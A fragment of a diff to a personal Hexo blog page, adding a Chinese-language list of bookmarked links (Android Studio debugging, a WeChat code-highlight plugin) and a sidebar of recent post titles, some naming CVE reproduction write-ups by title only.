+<p>  <a href="https://www.jianshu.com/p/011eb88f4e0d" target="_blank" rel="noopener">你所不知道的Android Studio调试技巧
+</a></p>
+<p>  （备注：虽然文章题为《你所不知道的Android Studio调试技巧》，但该文章的经验同样可以用于IntelliJ IDEA，这篇文章整理得很不错。）</p>
+<p>  <a href="https://jingyan.baidu.com/article/6b182309f7b363ba58e15998.html" target="_blank" rel="noopener">如何查看自己电脑系统的序列号？</a></p>
+<p>  <a href="https://mp.weixin.qq.com/s/idP0i3mmAT0mpBV5Tf5iGQ" target="_blank" rel="noopener">马上就到 2019 了，跳槽？先定 7 个小目标</a></p>
+<p>  <a href="https://github.com/imlinhanchao/crx_wx_code_highlight" target="_blank" rel="noopener">微信公众平台代码高亮插入插件</a></p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://chenergy1991.github.io/2019/03/17/好的链接/" data-id="cjtcu8b4r0004o8v14h68yi82" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/chenergy1991.github.io/2019/03/14/hello-world/" class="article-date">
@@ -101,7 +678,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://chenergy1991.github.io/2019/03/14/hello-world/" data-id="cjtcu6tq40000wwv10p1lt1cq" class="article-share-link">Share</a>
+      <a data-url="https://chenergy1991.github.io/2019/03/14/hello-world/" data-id="cjtcu8b4l0003o8v11je1zg6h" class="article-share-link">Share</a>
       
       
     </footer>
@@ -142,7 +719,23 @@
       <ul>
         
           <li>
-            <a href="/chenergy1991.github.io/2019/03/14/hello-world/">Hello World</a>
+            <a href="/chenergy1991.github.io/2019/03/17/MyJavaWebSecurityBlog/">我写的Java Web安全技术博客</a>
+          </li>
+        
+          <li>
+            <a href="/chenergy1991.github.io/2019/03/17/how-to-use-jad/">How to use JAD?</a>
+          </li>
+        
+          <li>
+            <a href="/chenergy1991.github.io/2019/03/17/django-excel-tool/">可实现&#34;导入导出Excel&#34;的Django小应用</a>
+          </li>
+        
+          <li>
+            <a href="/chenergy1991.github.io/2019/03/17/CVE-2018-1261/">CVE-2018-1261（Spring Integration Zip不安全解压漏洞）复现和分析</a>
+          </li>
+        
+          <li>
+            <a href="/chenergy1991.github.io/2019/03/17/CVE-2017-7275/">CVE-2017-7275：Jackson-databind漏洞复现与分析笔记</a>
           </li>
         
       </ul>
